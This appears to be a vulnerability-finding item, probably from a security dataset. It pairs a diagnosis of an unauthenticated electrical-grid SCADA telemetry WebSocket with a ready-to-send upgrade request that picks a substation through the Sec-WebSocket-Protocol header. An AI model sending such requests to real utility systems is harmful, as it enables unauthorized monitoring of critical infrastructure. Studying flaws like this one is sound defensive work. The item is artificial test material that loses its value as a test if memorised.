diagnosis: The electrical grid SCADA monitor extracts substationId from the Sec-WebSocket-Protocol header and establishes a real-time telemetry stream for high-voltage transformers and circuit breakers. It lacks authentication and zone authorization checks during the WebSocket upgrade handshake, allowing unauthorized actors to monitor critical municipal electrical infrastructure.
exploit_request:
GET /ws/scada/telemetry HTTP/1.1
Host: scada.regional-power.gov:9000
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: c2NhZGEta2V5LTA5OTA=
Sec-WebSocket-Version: 13
Sec-WebSocket-Protocol: scada-telem, substation-sub_metro_central_01
